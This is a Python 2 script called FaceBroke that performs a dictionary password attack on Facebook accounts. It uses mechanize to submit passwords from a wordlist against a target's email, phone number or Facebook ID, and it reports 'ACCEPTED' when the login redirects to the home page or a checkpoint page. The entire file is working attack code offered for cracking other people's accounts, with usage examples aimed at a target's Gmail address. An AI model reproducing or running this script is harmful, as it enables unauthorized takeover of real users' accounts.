#!/usr/bin/python2

#############################
import sys,optparse,platform
sys.path.append('./lib/')
import tools_core,mechanize
#############################
opsys = platform.system()
#############################
def cracking(target,wordlist):
	situs = 'https://www.facebook.com/login.php'
	print "[#]==============={ TARGET INFORMATION }===============[#]"
	print " [>] TARGET : "
	print " [>] WORDLIST "
	print "[#]==============={ END OF INFORMATION }===============[#]"
	print ""
	print "[*] Configuring Mechanize..."
	try:
		browser = mechanize.Browser()
		browser.set_handle_robots(False)
		print "[+] Mechanize Configured"
	except:
		print "[!] Error: Error when configurin Mechanize !"
		print "    Are you already install it ? If not..."
		print "Use 'pip install mechanize' command !"
		exit()
	print "[*] Preparing Wordlist..."
	try:
		wlist = open(wordlist,'r').readlines()
		jumlah = str(len(wlist))
		print "[+] {} Word-Phrase Loaded !".format(jumlah)
		print "[+] Done :)"
	except:
		print tools_core.err_bukalst
		exit()
	print ""
	print "[#]==============={ LAUNCHING ATTACK }===============[#]"
	print ""
	hitung = 0
	for pwd in wlist:
		try:
			hitung += 1
			passkata = pwd.strip()
			browser.open(situs)
			browser.select_form(nr=0)
			browser.form['email'] = target
			browser.form['pass'] = passkata
			pencet = browser.submit()
			respon = pencet.geturl()
			if respon == 'https://www.facebook.com/':
				print ""
				print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				break
			elif respon == 'https://www.facebook.com/checkpoint/?next=https://www.facebook.com/':
				print ""
				print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				break
			elif respon == 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2F':
				print ""
				print "[ ACCEPTED ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				break
			else:
				print "[ INVALID ]==[{0}/{1}]==[{2}]===> {3}".format(hitung,jumlah,target,passkata)
				pass
		except KeyboardInterrupt:
			print ""
			print tools_core.err_keyint
			exit()
		except:
			print "[!] Error: Mechanize Error! Mechanize failed to load sites or maybe caused"
			print "    by another reason...please try again later..."
			exit()

def main():
	tools_core.clearscreen(opsys)
	tools_core.judul()
	parser = optparse.OptionParser('''
 [?] Usage: Use 'FaceBroke.py --help' to show Help Contents

 [X] Example: FaceBroke.py -t somebody@gmail.com -w '/root/wordlist/pass.txt'
  |---> Crack using Target's Gmail and Wordlist
 [X] Example: FaceBroke.py -t +100910301 -w '/root/wordlist/pass.txt'
  |---> Crack using Target's Phone Number and Wordlist
 [X] Example: FaceBroke.py -t 1149898194819 -w '/root/wordlist/pass.txt'
  |---> Crack using Target's Facebook ID and Wordlist
''')
	parser.add_option("-t",dest="TARGET",help="Specify Target (Email,PhoneNumber,FacebookID)")
	parser.add_option("--target",dest="TARGET",help="Specify Target (Email,PhoneNumber,FacebookID)")
	parser.add_option("-w",dest="PASS_FILE",help="Your Wordlist Location")
	parser.add_option("--wordlist",dest="PASS_FILE",help="Your Wordlist Location")
	(options, args) = parser.parse_args()
	if(bool(options.TARGET) == False):
		print parser.usage
		exit()
	if(bool(options.PASS_FILE) == False):
		facebroke_wlist = './wordlist/mxact666_password.txt'
	if(bool(options.TARGET) == True):
		facebroke_target = str(options.TARGET)
	if(bool(options.PASS_FILE) == True):
		facebroke_wlist = str(options.PASS_FILE)
	cracking(facebroke_target,facebroke_wlist)

if __name__ == '__main__':
	main()


#https://www.facebook.com/checkpoint/?next=%2Fpassword%2Fchange%2Freason%2F